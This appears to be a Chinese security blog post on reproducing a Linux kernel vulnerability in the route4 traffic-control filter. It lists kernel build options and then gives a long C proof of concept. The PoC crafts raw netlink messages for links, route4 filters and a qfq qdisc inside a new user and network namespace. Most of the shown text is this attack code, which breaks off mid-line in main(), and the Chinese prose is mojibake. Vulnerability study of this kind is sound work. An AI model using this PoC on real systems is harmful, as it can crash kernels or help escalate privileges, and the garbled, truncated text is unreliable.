<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>é¦–å…ˆæ˜¯å¾—æŠŠæ¼æ´æ¨¡å—ç¼–è¯‘è¿›å…¥å†…æ ¸ï¼Œå…¶æ¬¡è¿˜è¦å‹¾ä¸Šå‡ ä¸ªç¼–è¯‘é€‰é¡¹,è¿™äº›ç¼–è¯‘é€‰é¡¹æœ€å¥½ä¸è¦ç›´æ¥åœ¨.configä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºæœ‰äº›ç¼–è¯‘é€‰é¡¹ä¾èµ–äºå…¶ä»–çš„ç¼–è¯‘é€‰é¡¹ï¼Œæ‰€ä»¥æœ€å¥½æ˜¯åœ¨<code>make menuconfig</code>ä¸­è¿›è¡Œä¿®æ”¹ï¼Œæƒ³è¦æŸ¥æ‰¾æŸä¸€ä¸ªç¼–è¯‘é€‰é¡¹åœ¨ä»€ä¹ˆä½ç½®å¯ä»¥ä½¿ç”¨menuconifgçš„å¿«æ·é”®<code>/</code>è¿›è¡Œæœç´¢ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_BINFMT_MISC=y</span><br><span class="line">CONFIG_USER_NS=y</span><br><span class="line">CONFIG_NET_CLS_ROUTE4=y</span><br><span class="line">CONFIG_DUMMY=y CONFIG_NET_SCH_QFQ=y</span><br><span class="line">CONFIG_NET_CLS_ACT=y CONFIG_NET_CLS_BASIC=y</span><br><span class="line">CONFIG_NET_SCH_SFQ=y</span><br><span class="line">CONFIG_NET_EMATCH_META=y</span><br><span class="line">CONFIG_E1000=y CONFIG_E1000E=y</span><br></pre></td></tr></table></figure>

<h3 id="pocå­¦ä¹ "><a href="#pocå­¦ä¹ " class="headerlink" title="pocå­¦ä¹ "></a>pocå­¦ä¹ </h3><p>pocå¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        dprintf(<span class="number">2</span>, <span class="string">&quot;%02X &quot;</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i];</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i + <span class="number">1</span> == size)</span><br><span class="line">        &#123;</span><br><span class="line">            dprintf(<span class="number">2</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dprintf(<span class="number">2</span>, <span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">1</span> == size)</span><br><span class="line">            &#123;</span><br><span class="line">                ascii[(i + <span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    dprintf(<span class="number">2</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i + <span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    dprintf(<span class="number">2</span>, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                dprintf(<span class="number">2</span>, <span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> newlink[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWLINK */</span></span><br><span class="line">        <span class="number">16</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_flags */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_change */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">16</span>, <span class="number">0x00</span>, <span class="number">18</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nested nla_len, nla_type */</span></span><br><span class="line">        <span class="number">10</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> dellink[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = DELLINK */</span></span><br><span class="line">        <span class="number">17</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_ifindex */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_flags */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_change */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> tfilter[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWTFILTER */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="comment">/* OPTIONS */</span></span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_TO */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_FROM */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ntfilter[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWTFILTER */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="comment">/* 0x200 = NLM_F_EXCL */</span></span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* OPTIONS */</span></span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_TO */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_FROM */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> linkcmd[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWQDISC */</span></span><br><span class="line">        <span class="number">36</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x05</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">build_qfq</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *qopt;</span><br><span class="line">        <span class="keyword">short</span> *tlen;</span><br><span class="line">        <span class="keyword">char</span> *qdisc = <span class="string">&quot;qfq&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">short</span> *optlen;</span><br><span class="line">        <span class="keyword">short</span> *opttype;</span><br><span class="line"></span><br><span class="line">        tlen = buf;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, linkcmd, <span class="keyword">sizeof</span>(linkcmd));</span><br><span class="line">        <span class="built_in">strcpy</span>(buf+<span class="keyword">sizeof</span>(linkcmd), qdisc);</span><br><span class="line">        *tlen = <span class="keyword">sizeof</span>(linkcmd) + <span class="built_in">strlen</span>(qdisc) + <span class="number">1</span>;</span><br><span class="line">        buf[<span class="number">36</span>] = <span class="built_in">strlen</span>(qdisc)+<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        qopt = buf + *tlen;</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="comment">/* 24, 0x00, 0x02, 0x00, */</span></span><br><span class="line">        optlen = qopt;</span><br><span class="line">        opttype = optlen + <span class="number">1</span>;</span><br><span class="line">        *opttype = <span class="number">0x2</span>;</span><br><span class="line"></span><br><span class="line">        *optlen = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        *tlen += *optlen;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> *tlen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">pid_t</span> p;</span><br><span class="line">        <span class="keyword">int</span> *error;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">4096</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> tlen;</span><br><span class="line">        <span class="keyword">char</span> buf2[<span class="number">4096</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        error = (<span class="keyword">int</span> *) (buf + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWUSER|CLONE_NEWNET);</span><br><span class="line">        tlen = build_qfq(buf);</span><br><span class="line">        s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);</span><br><span class="line">        perror(<span 